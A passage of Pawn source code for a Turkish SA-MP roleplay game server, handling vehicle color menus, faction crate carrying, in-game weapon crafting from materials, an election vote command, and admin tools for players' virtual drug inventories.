	//format(mstring, sizeof(mstring), "Renk 1\t\t (%d)\nRenk 2\t\t (%d)\nHýz Sabitleme\t (%s)\nYakýt Tipi\t (%s)\nKilit Seviyesi\t ("C2"%d"C1")\nAlarm Seviyesi\t ("C2"%d"C1")\nImmobilizer Seviyesi\t ("C2"%d"C1")\nSilah Slotu\t ("C2"%d"C1")\nKilometre\t ("C2"%d"C1")Koltuk Sayýsý\t ("C2"%d"C1")\nFiyat\t\t ("C2"%d"C1")\nVergi\t\t ("C2"%d"C1")\nOnayla\t("C2"ONAYLAMADAN ÖNCE KONTROL EDÝN."C1")",
    HexRenkVer(AllCarColors[SectigiAracRenk1[playerid]]),
	SectigiAracRenk1[playerid],
	_r1text,
	HexRenkVer(AllCarColors[SectigiAracRenk2[playerid]]),
	SectigiAracRenk2[playerid],
	_r2text,
	_htext,
	//_ytext,
	SectigiKilit[playerid],
	_kilitfiyat,
	SectigiAlarm[playerid],
	_alarmfiyat);
	format(mstring, sizeof(mstring),"%s\nImmo Seviyesi\t ( {B3B3B3}%d{FFFFFF} "C2"(%d"DOLAR"$"C2") "C2")\nKilometre\t ( {B3B3B3}%d{FFFFFF} )\nKoltuk Sayýsý\t ( {B3B3B3}%d{FFFFFF} )\nFiyat\t\t ( %d"DOLAR"$"C2" "C1")\nVergi\t\t ( %d"DOLAR"$"C2" "C1")\nOnayla\t(({B3B3B3} ONAYLAMADAN ÖNCE KONTROL EDÝN.{FFFFFF} ))",
	mstring,
	SectigiImmo[playerid],
	_immofiyat,
	0,
	_akoltuk,
	_afiyat,
	_avergi);
	AldigiAracFiyati[playerid] = _afiyat;
	return ShowPlayerDialog(playerid, 261, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
}

BosIndex(playerid)
{
    for(new i=0; i<MAX_PLAYER_ATTACHED_OBJECTS; i++)
    {
        if(!IsPlayerAttachedObjectSlotUsed(playerid, i)) return i;
    }
    return -1;
}

KutuPos(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 3, 2574.2217,-1282.4111,1044.1250)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, 2574.2947,-1287.4930,1044.1250)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, 2573.0562,-1296.6813,1044.1250)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, 2576.1843,-1299.1115,1044.1250)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, 2574.8218,-1304.7075,1044.1250)) return 1;
	return 0;
}

UKutuPos(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 3, -1390.0215,1497.4130,1.8672)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1394.3019,1497.6188,1.8735)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1394.6914,1480.8799,1.8672)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1390.8535,1481.0007,1.8672)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1401.4332,1480.8206,1.8672)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1407.9448,1481.8420,1.8672)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 3, -1403.8812,1481.4919,1.8672)) return 1;
	return 0;
}

KutuSaat()
{
	new _hour,_minuite,_second;
	gettime(_hour,_minuite,_second);
	#pragma unused _minuite
	#pragma unused _second
	if(_hour >= 19) return 1;
	if(_hour <= 4) return 1;
	return 0;
	//return 1;
}

stock KutuVer(playerid, tip=0)
{
	kindex[playerid] = BosIndex(playerid);
	if(tip == 0)
	{
	    new _randomat = randomEx(1,3);
	    if(Birlik[Karakter[playerid][birlik]][seviye] == 4) _randomat = randomEx(1,4);
	    if(Birlik[Karakter[playerid][birlik]][seviye] == 5) _randomat = randomEx(1,5);
	    switch(_randomat)
	    {
	        case 1: { SetPlayerAttachedObject(playerid, kindex[playerid], 2912, 1, 0.160999, 0.501999, -0.260000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999); KutuTasiyor[playerid] = 1; }
			case 2: { SetPlayerAttachedObject(playerid, kindex[playerid], 1271, 1, 0.207999, 0.501999, -0.006000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999); KutuTasiyor[playerid] = 2; }
			case 3: { SetPlayerAttachedObject(playerid, kindex[playerid], 2328, 1, 0.240998, 0.398999, 1.135000, 12.999997, 101.899986, -90.800041, 0.644999, 0.953000, 0.559999); KutuTasiyor[playerid] = 3; }
			case 4: { SetPlayerAttachedObject(playerid, kindex[playerid], 2969, 1, 0.127999, 0.501999, -0.006000, 7.299997, 99.100028, 170.300003, 1.043000, 0.905000, 1.041999); KutuTasiyor[playerid] = 4; }
			case 5: { SetPlayerAttachedObject(playerid, kindex[playerid], 2969, 1, 0.127999, 0.501999, -0.006000, 7.299997, 99.100028, 170.300003, 1.043000, 0.905000, 1.041999); KutuTasiyor[playerid] = 5; }
		}
	}
	else if(tip == 1) { SetPlayerAttachedObject(playerid, kindex[playerid], 2912, 1, 0.160999, 0.501999, -0.260000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999); KutuTasiyor[playerid] = 1; }
	else if(tip == 2) { SetPlayerAttachedObject(playerid, kindex[playerid], 1271, 1, 0.207999, 0.501999, -0.006000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999); KutuTasiyor[playerid] = 2; }
	else if(tip == 3) { SetPlayerAttachedObject(playerid, kindex[playerid], 2328, 1, 0.240998, 0.398999, 1.135000, 12.999997, 101.899986, -90.800041, 0.644999, 0.953000, 0.559999); KutuTasiyor[playerid] = 3; }
	else if(tip == 4) { SetPlayerAttachedObject(playerid, kindex[playerid], 2969, 1, 0.127999, 0.501999, -0.006000, 7.299997, 99.100028, 170.300003, 1.043000, 0.905000, 1.041999); KutuTasiyor[playerid] = 4; }
	else if(tip == 5) { SetPlayerAttachedObject(playerid, kindex[playerid], 2969, 1, 0.127999, 0.501999, -0.006000, 7.299997, 99.100028, 170.300003, 1.043000, 0.905000, 1.041999); KutuTasiyor[playerid] = 5; }
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.1, 1, 1, 1, 1, 1, 1);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

	return 1;
}
stock MateryalMenu(playerid, tip[])
{
	new sid,mstring[1024];
	if(strlen(tip) == 3)
	{
		new _tip[4];
		format(_tip, 4, "%s", tip);
	    strdel(_tip, strlen(_tip)-1, strlen(_tip));
	    sid = strval(_tip);
	    new _sid;
		for(new i;i<sizeof(SilahVerileri);i++)
		{
		    if(sid == SilahVerileri[i][0])
		    {
				_sid = i;
		        break;
			}
		}
	    format(mstring, sizeof(mstring), "\n"C1"D Materyal: ( "C2"%d "C1")\n"C1"1 Þarjör: ( "C2"%d mermi "C1")\n\n"C1"Þarjör yapmak istiyor musunuz:\n"C2"((Yapým süresi 1 dakika sürecektir.))",SilahVerileri[_sid][4],SilahVerileri[_sid][5]);
	    ShowPlayerDialog(playerid, 260, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Materyal", mstring, "Evet", "Hayýr");
	}
	else if(strlen(tip) == 2)
	{
	    sid = strval(tip);
	    new _sid;
		for(new i;i<sizeof(SilahVerileri);i++)
		{
		    if(sid == SilahVerileri[i][0])
		    {
				_sid = i;
		        break;
			}
		}
	    format(mstring, sizeof(mstring), "\n"C1"A Materyal: ( "C2"%d "C1")\n"C1"B Materyal: ( "C2"%d "C1")\n"C1"C Materyal: ( "C2"%d "C1")\n"C1"D Materyal: ( "C2"%d "C1")\n"C1"E Materyal: ( "C2"%d "C1")\n\n"C1"Silahý yapmak istiyor musunuz:\n"C2"((Yapým süresi %d payday sürecektir.))", SilahVerileri[_sid][1], SilahVerileri[_sid][2], SilahVerileri[_sid][3], SilahVerileri[_sid][4], SilahVerileri[_sid][5], SilahVerileri[_sid][6]);
	    ShowPlayerDialog(playerid, 259, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Materyal", mstring, "Evet", "Hayýr");
	}
	MateryalSilah[playerid] = sid;
	return 1;
}
AracRenk1(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk1ayarliyo[playerid] = 2;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk2(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk2ayarliyo[playerid] = 2;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk1Ex(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk1ayarliyo[playerid] = 3;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk2Ex(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk2ayarliyo[playerid] = 3;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk1Exx(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk1ayarliyo[playerid] = 4;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk2Exx(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk2ayarliyo[playerid] = 4;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk1Exx_1(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk1ayarliyo[playerid] = 5;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk2Exx_1(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk2ayarliyo[playerid] = 5;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk1Exx_2(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk1ayarliyo[playerid] = 6;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
AracRenk2Exx_2(playerid)
{
    for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawShowForPlayer(playerid,ChangeColor[i]);
        renk2ayarliyo[playerid] = 6;
 	}
  	SelectTextDraw(playerid, 0xFFFFFF66) ;
}
stock MermisizSilah(id)
{
	switch(id)
	{
	    case 22..36: return 0;
	}
	return 1;
}
stock HexToEmbed(szHex[])
{
	new
		szVal[16];

	format(szVal, sizeof(szVal), "{%s}", szHex);
	strdel(szVal, 1, 3);
	strdel(szVal, strlen(szVal) - 3, strlen(szVal) - 1);
	return szVal;
}

forward SilahFab(playerid, sid, tip);
public SilahFab(playerid, sid, tip)
{
	new mstring[128];
	if(tip == 0)
	{
		format(mstring, sizeof(mstring), "Baþarýyla %s silahý yaptýnýz.",SilahIsim(sid));
		OyuncuSilahVer(1, playerid, sid, 0);
	}
	else if(tip == 1)
	{
	    new _sarjor;
        for(new i;i<sizeof(SilahVerileri);i++)
        {
            if(sid == SilahVerileri[i][0])
            {
                _sarjor = SilahVerileri[i][5];
                break;
			}
        }
		format(mstring, sizeof(mstring), "Baþarýyla 1 þarjör(%d mermi) %s silahý mermisi yaptýnýz.",_sarjor, SilahIsim(sid));
		Karakter[playerid][MermiM][sid] += _sarjor;
	}
	COZ(playerid);
	Bilgi(playerid, mstring);
	Log(playerid, mstring);
	return 1;
}

CMD:kutu(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != MAFYA) return 1;
	if(Birlik[Karakter[playerid][birlik]][seviye] < 3) return Hata(playerid, "Birlik seviyeniz yeterli deðil. [Seviye 3]");
	new nstring[16];
	if(sscanf(params,"s[16]",nstring)) return Kullanim(playerid, "/kutu [fonksiyon]"),SendClientMessage(playerid, -1,"Geçerli fonksiyonlar: tasi, birak");
	if(Buysa("tasi",nstring))
	{
	    if(!KutuSaat() && Karakter[playerid][adminlevel] < 6) return Hata(playerid, "Bu saatte kutu taþýyamazsýnýz.");
	    if(!KutuPos(playerid)) return Hata(playerid, "Kutu taþýyacaðýnýz bir yerde deðilsiniz.");
	    if(KutuTasiyor[playerid] != 0) return Hata(playerid, "Zaten þuanda kutu taþýmaktasýnýz.");
	    if(GetPlayerCash(playerid) < 200) return Hata(playerid, "Yeterli miktarda paranýz yok! [200$]");
	    GivePlayerCash(playerid, -200);
	    KutuVer(playerid);
	}
	else if(Buysa("birak",nstring))
	{
	    if(KutuTasiyor[playerid] == 0) return Hata(playerid, "Kutu taþýmýyorsunuz.");
	    new veh = GetNearestVehicle(playerid);
	    if(!IsValidVehicle(veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	    if(!IsLoadableVehicle(veh)) return Hata(playerid, "Bu araca kutu býrakamazsýnýz.");
	    if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
		for(new i=0;i<sizeof(AracVerileri);i++) {
		    if(AracVerileri[i][0] == GetVehicleModel(veh)) {
				if(Kutular[veh] == AracVerileri[i][1]) return Hata(playerid, "Araçta yer yok.");
			}
		}
	    switch(KutuTasiyor[playerid])
	    {
	        case 1: Materyal[veh][A]++;
	        case 2: Materyal[veh][B]++;
	        case 3: Materyal[veh][C]++;
	        case 4: Materyal[veh][D]++;
	        case 5: Materyal[veh][E]++;
	    }
	    Kutular[veh]++;
	    if(Kutular[veh] == 10) Ipucu(playerid, "Aracýn kutu kapasitesi doldu.");
	    RemovePlayerAttachedObject(playerid, kindex[playerid]);
    	ClearAnimations(playerid);
    	SetPlayerSpecialAction(playerid, 0);
		KutuTasiyor[playerid] = 0;
	}
	return 1;
}

CMD:materyal(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new nstring[16],pid,_tip[2],_miktar=0;
	if(isnull(params)) return Kullanim(playerid, "/materyal [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: yap, bilgi, ver");
    sscanf(params,"s[16]us[2]i",nstring,pid,_tip,_miktar);
	if(Buysa("ver",nstring))
	{
	    if(!Girdi[pid] || !IsPlayerConnected(pid) || isnull(_tip) || _miktar <= 0) return Kullanim(playerid, "/materyal ver [oyuncuID] [tip] [miktar]"),SendClientMessage(playerid, -1, "Geçerli tipler: A, B, C, D, E");
		if(Birlik[Karakter[pid][birlik]][ftip] != MAFYA && Birlik[Karakter[pid][birlik]][ftip] != YARIS && Birlik[Karakter[pid][birlik]][ftip] != CETE && Birlik[Karakter[pid][birlik]][ftip] != MC) return Hata(playerid, "Bu oyuncuya materyal veremezsiniz.");
		if(Buysa("a",_tip))
		{
		    if(Karakter[playerid][matA] < _miktar) return Hata(playerid, "Üzerinizde yeterli materyal yok.");
		    Karakter[pid][matA] += _miktar;
		    Karakter[playerid][matA] -= _miktar;
		}
		else if(Buysa("b",_tip))
		{
		    if(Karakter[playerid][matB] < _miktar) return Hata(playerid, "Üzerinizde yeterli materyal yok.");
		    Karakter[pid][matB] += _miktar;
		    Karakter[playerid][matB] -= _miktar;
		}
		else if(Buysa("c",_tip))
		{
		    if(Karakter[playerid][matC] < _miktar) return Hata(playerid, "Üzerinizde yeterli materyal yok.");
		    Karakter[pid][matC] += _miktar;
		    Karakter[playerid][matC] -= _miktar;
		}
		else if(Buysa("d",_tip))
		{
		    if(Karakter[playerid][matD] < _miktar) return Hata(playerid, "Üzerinizde yeterli materyal yok.");
		    Karakter[pid][matD] += _miktar;
		    Karakter[playerid][matD] -= _miktar;
		}
		else if(Buysa("e",_tip))
		{
		    if(Karakter[playerid][matE] < _miktar) return Hata(playerid, "Üzerinizde yeterli materyal yok.");
		    Karakter[pid][matE] += _miktar;
		    Karakter[playerid][matE] -= _miktar;
		}
		else return Hata(playerid, "Hatalý tür belirttiniz.");
		new mstring[128];
		format(mstring, sizeof(mstring), "%s adlý oyuncuya %d adet %s materyali verdiniz.",OyuncuAdiniBul(pid),_miktar,_tip);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s adlý oyuncu size %d adet %s materyali verdi.",OyuncuAdiniBul(playerid),_miktar,_tip);
		Bilgi(pid, mstring);
		Log(playerid, mstring);
		Log(pid, mstring);
	}
	else if(Buysa("yap",nstring))
	{
	    if(Karakter[playerid][silahpayday] > 0) {
			new nxstring[64];
			format(nxstring, sizeof(nxstring), "Zaten silah üretiyorsunuz. Kalan payday %d", Karakter[playerid][silahpayday]);
			return Hata(playerid, nxstring);
		}
		if(!IsPlayerInRangeOfPoint(playerid, 5, 2136.0251,-2286.0977,20.2734)) return Hata(playerid, "Silah, mermi yapabileceðiniz yerde deðilsiniz.");
		if(Birlik[Karakter[playerid][birlik]][ftip] != MAFYA && Birlik[Karakter[playerid][birlik]][ftip] != YARIS && Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC) return Hata(playerid, "Bu komutu sadece MAFYA, ÇETE, MC ve YARIÞ birlikleri kullanabilir.");
		if(Karakter[playerid][rutbe] >= 11) return Hata(playerid, "Bu komutu kullanma yetkiniz yok. [Rütbe 10 ve üstü]");
		new mstring[1024];
		strcat(mstring, "Pistol\t\t ( "C2"Silah"C1" ) ");
		strcat(mstring, "\n");
		strcat(mstring, "Deagle\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "Shotgun\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "Uzi\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "MP5\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "AK47\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "M4A1\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "Tec-9\t\t ( "C2"Silah "C1") ");
		strcat(mstring, "\n");
		strcat(mstring, "C.Rifle\t\t ( "C2"Silah "C1") ");
		ShowPlayerDialog(playerid, 258, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Materyal", mstring, "Yap", "Ýptal");
	}
	else if(Buysa("bilgi",nstring))
	{
		SendClientMessageEx(playerid, -1, ""C2"[MATERYAL] "C1"A Materyal: %d - B Materyal: %d - C Materyal: %d - D Materyal: %d - E Materyal: %d",Karakter[playerid][matA],Karakter[playerid][matB],Karakter[playerid][matC],Karakter[playerid][matD],Karakter[playerid][matE]);
	}
	return 1;
}

HexRenkVer(renk)
{
	new _i,_string[16];
	for(new i;i<sizeof(AllCarColors);i++)
	{
	    if(renk == AllCarColors[i])
	    {
	        _i = i;
	        break;
	    }
	}
	format(_string, sizeof(_string), "{%s}", AllCarColors2[_i]);
	strdel(_string, 1, 3);
	strdel(_string, strlen(_string) - 3, strlen(_string) - 1);
	return _string;
}

stock TextureVer(i, id, index)
{
	if(Mobilya[i][mtexture][index] != 0 && Mobilya[i][mtexturerenk][index] != -1)
	{
		SetDynamicObjectMaterial(Mobilya[i][mobje], index, Textures[id][0], Textures[id][1], Textures2[id][1], TextureColor[Mobilya[i][mtexturerenk][index]]);
	}
	else if(Mobilya[i][mtexture][index] != 0 && Mobilya[i][mtexturerenk][index] == -1)
	{
		SetDynamicObjectMaterial(Mobilya[i][mobje], index, Textures[id][0], Textures[id][1], Textures2[id][1]);
	}
	else if(Mobilya[i][mtexturerenk][index] != -1 && Mobilya[i][mtexture][index] == 0)
	{
		SetDynamicObjectMaterial(Mobilya[i][mobje], index, 0, "none", "none", TextureColor[Mobilya[i][mtexturerenk][index]]);
	}
	return 1;
}

/*CMD:secimdurum(playerid, params[])
{
	new mstring[128];
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1) return 1;
	format(mstring,sizeof(mstring),"{FFFFFF}Sarah Pressley: {ff0000}%d Oy\n{FFFFFF}Marshall Kingsley: {ff0000}%d Oy",Secim[sarah],Secim[marshall]);
	ShowPlayerDialog(playerid, 900, DIALOG_STYLE_MSGBOX, "2019 Los Santos Vali Seçimleri", mstring, "Ýleri", "Kapat");
	return 1;
}*/

CMD:oykullan(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(!aSecim) return Hata(playerid, "Þu an oy kullanamazsýnýz, oy kullanýmlarý henüz aktif deðil.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 1794.4739,-1348.1967,2061.1934)) return Hata(playerid, "Seçim merkezinde deðilsiniz.");
	if(Karakter[playerid][oydurum] == 1) return Hata(playerid, "Zaten oy kullanmýþsýnýz.");
	if(Karakter[playerid][oydurum] == 0) { ShowPlayerDialog(playerid, 888, DIALOG_STYLE_LIST, "Seçim Merkezi", "{FFFFFF}Cumhuriyetçi Parti - {ff0000}Marshall Kingsley\n{FFFFFF}Demokrat Parti - {ff0000}Sarah Pressley", "Oy Ver", "Kapat"); }
	return 1;
}

CMD:paintball(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid,3.0,776.3368,-1036.1980,24.2733))
	{
    	Hata(playerid, "Þuanda inaktiftir.");
    }
	return 1;
}
/*CMD:erpdevpaintballkomutu(playerid, params[])
{
	if(Girdi[playerid])
	{
	    new mstring[16];
	    if(sscanf(params,"s[16]",mstring)) return Kullanim(playerid, "/paintball [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: gir, cik");
		if(Buysa("gir",mstring))
		{
			if(IsPlayerInRangeOfPoint(playerid,3.0,776.3368,-1036.1980,24.2733))
			{
			    if(PBStarted == false)
			    {
			        pHP[playerid] = GetPlayerCan(playerid);
			        pARMO[playerid] = GetPlayerZirh(playerid);
				    new RandomSpawn = random(sizeof(PBSpawns));
				    new RandomSkin = random(sizeof(PBSkins));
				    SetPlayerSkin(playerid,PBSkins[RandomSkin]);
					SetPlayerPos(playerid,PBSpawns[RandomSpawn][0],PBSpawns[RandomSpawn][1],PBSpawns[RandomSpawn][2]);
					SetPlayerFacingAngle(playerid,PBSpawns[RandomSpawn][3]);
					SetPlayerVirtualWorld(playerid, 1);
					SetPlayerInterior(playerid, 1);
					ShowPlayerDialog(playerid,276,2,""C7"EIGHTBORN - "C8"Paintball Sistemi","Desert Eagle\nShotgun\nM4\nMP5\nSniper","Oyla","Çýk");
					TogglePlayerControllable(playerid,0);
					PlayerPBing[playerid] = true;
					PBLeaderid = playerid;
					PBLeaderKills = 0;
					PBPlayers++;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Oyuna dahil olabilmek için bir sonraki eli beklemelisiniz.");
					SendClientMessage(playerid, -1, "{E84D4D}[Paintball]{FFFFFF} Paintball maç süresi toplam 5 dakikadýr.");
				}
			}
			else return Hata(playerid, "Bulunduðunuz konumdan Paintball maçýna dahil olamazsýnýz.");
		}
		else if(Buysa("cik",mstring))
		{
		    if(!PlayerPBing[playerid]) return Hata(playerid, "Þuanda paintball maçýnda deðilsiniz.");
		    DONDUR(playerid);
		    PlayerPBing[playerid] = false;
		    PBPlayers--;
		    SetPlayerTeam(playerid, NO_TEAM);
		    SetPlayerHealth(playerid, pHP[playerid]);
			SetPlayerArmour(playerid, pARMO[playerid]);
		    SetPlayerPos(playerid,776.3368,-1036.1980,24.2733);
			SetPlayerSkin(playerid, Karakter[playerid][skin]);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
			ResetPlayerWeapons(playerid);
			COZ(playerid);
			Bilgi(playerid, "Paintball maçýndan çýktýnýz.");
			if(PBPlayers <= 0) PaintBallEnd();
		}
	}
	return 1;
}*/

forward SetNumsCars();
public SetNumsCars()
{
	new MAXCAR = CreateVehicle(411,0,0,0,0,0,0,-1);
    DestroyVehicle(MAXCAR);

	for (new car=1; car < MAXCAR; car++)
    	CarFullHealth[car] = 1;

	return 1;
}

forward CheckPlayerInCar(playerid);
public CheckPlayerInCar(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return KillTimer(TimerPlayerInCar[playerid]);

	new vehicleid = GetPlayerVehicleID(playerid),Float:health;
	GetVehicleHealth(vehicleid, health);

	if(CarFullHealth[vehicleid] == 1 && health < 1000) return CarFullHealth[vehicleid] = 0;

	if(CarFullHealth[vehicleid] == 0 && health == 1000 && Karakter[playerid][adminlevel] < 1)
	{
		new mstring[64];
		format(mstring,sizeof(mstring), "%s(%d) - CarFix",OyuncuAdiniBul(playerid),playerid);
		AdminGonder(mstring);

		CarFullHealth[vehicleid] = 1;
		return 1;
	}
 	return 1;
}

forward RepairVehicleEx(vehicleid);
public RepairVehicleEx(vehicleid)
{
	CarFullHealth[vehicleid] = 1;
	RepairVehicle(vehicleid);
 	return 1;
}

forward SetVehicleHealthEx(vehicleid, Float:health);
public SetVehicleHealthEx(vehicleid, Float:health)
{
	if(health == 1000) CarFullHealth[vehicleid] = 1;
	SetVehicleHealth(vehicleid, health);
 	return 1;
}

CMD:vwsifirla(playerid, params[])
{
	if(GetPlayerInterior(playerid) == 0 && GetPlayerVirtualWorld(playerid) != 0)
	{
		if(Karakter[playerid][kodes] > 0) return Hata(playerid, "Hapisteyken bu komutu kullanamazsýnýz.");
		Bilgi(playerid, "Virtualworld'unuz sýfýrlandý.");
		SetPlayerVirtualWorld(playerid, 0);
		Karakter[playerid][vworld] = 0;
	}
	else return Hata(playerid, "VW'nizi sýfýrlayamazsýnýz.");
	return 1;
}

IsAMyBoat(carid)
{
	new modelid = GetVehicleModel(carid);
	if(modelid == 453 || modelid == 454 || modelid == 473)
	{
		return 1;
	}
	return 0;
}

UKutuBirak(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 15, 2721.5273,-2576.1785,3.1963)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 15, 2728.8123,-2580.6743,3.1963)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 30, 2753.5830,-2581.0854,2.2109)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 15, 2774.3135,-2574.3035,3.1963)) return 1;
	return 0;
}

CMD:uduzenle(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 4 || !Girdi[playerid] || !AKontrol(playerid)) return 1;
	new giveplayerid;
	if(sscanf(params,"u",giveplayerid)) return Kullanim(playerid, "/uduzenle [oyuncuID]");
	new mstring[256];
	format(mstring, sizeof(mstring),"Esrar\t%d\n\
	Esrar Tohumu\t%d\n\
	Amfetamin\t%d\n\
	Metamfetamin\t%d\n\
	LSD\t%d\n\
	Extacy\t%d\n\
	Eroin\t%d\n\
	Kokain\t%d\n\
	Morfin\t%d\n\
	MDA\t%d\n\
	Eroin Tohumu\t%d\n\
	Kokain Tohumu\t%d\n",
	Karakter[giveplayerid][uesrar],
	Karakter[giveplayerid][esrartohum],
	Karakter[giveplayerid][amfetamin],
	Karakter[giveplayerid][metamfetamin],
	Karakter[giveplayerid][lsd],
	Karakter[giveplayerid][extacy],
	Karakter[giveplayerid][eroin],
	Karakter[giveplayerid][kokain],
	Karakter[giveplayerid][morfin],
	Karakter[giveplayerid][MDA],
	Karakter[giveplayerid][erointohum],
	Karakter[giveplayerid][kokaintohum]);
	ShowPlayerDialog(playerid, 280, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Uyuþturucu Düzenle", mstring, "Seç", "Ýptal");
	KDuzenleVar[playerid] = giveplayerid;
	return 1;
}

stock Isim(playerid)
{
	new __isim[MAX_PLAYER_NAME+1];
	GetPlayerName(playerid, __isim, sizeof(__isim));
	return __isim;
}
YonetimSay()
{
	new __sayi;
	foreach(new i : Player)
	{
	    if(Karakter[i][adminlevel] > 0 && Karakter[i][adminlevel] < 7) __sayi++;
	}
	return __sayi;
}
TesterSay()
{
	new __sayi;
	foreach(new i : Player)
	{
	    if(Karakter[i][tester] > 0) __sayi++;
	}
	return __sayi;
}

CMD:karakter(playerid, params[])
{
    BilgileriGoster(playerid, playerid);
	return 1;
}

BirlikKurmaPos(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 3, 1699.4009,-1667.8154,20.1998)) return 1;
	return 0;
}

stock GetPlayerIdFromName(playername[])
{
	for(new i = 0; i < strlen(playername); i++) {
		if(playername[i] == ' ')
		    playername[i] = '_';
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
  	{
    	if(IsPlayerConnected(i))
    	{
      		new playername2[MAX_PLAYER_NAME];
      		GetPlayerName(i, playername2, sizeof(playername2));
      		if(strcmp(playername2, playername, true, strlen(playername)) == 0)
      		{
        		return i;
      		}
    	}
  	}
  	return INVALID_PLAYER_ID;
}

stock EvAyarla(evid)
{
	if(Debug) printf("EvAyarla(%d)",evid);
	//if(IsValidDynamicPickup(Ev[evid][epickup])) DestroyDynamicPickup(Ev[evid][epickup]);
